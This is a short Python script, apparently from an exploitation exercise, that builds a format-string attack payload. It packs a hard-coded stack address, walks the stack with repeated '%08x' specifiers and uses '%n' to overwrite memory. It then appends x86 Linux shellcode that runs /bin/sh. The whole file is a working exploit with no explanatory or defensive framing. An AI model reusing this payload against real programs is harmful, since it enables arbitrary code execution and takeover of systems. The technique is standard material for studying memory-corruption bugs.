#!/usr/bin/python

import struct

WRITE_ADDR = 0xbffff59c

#bomb += struct.pack("I", WRITE_ADDR)
# Offset addr by 2
bomb = struct.pack("I", WRITE_ADDR+2)
bomb += "_"
bomb += "%08x."*13
#bomb += "%61725x.%n"
bomb += "%65413x.%n"
bomb += "\x90\x90\x90\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
print(bomb)

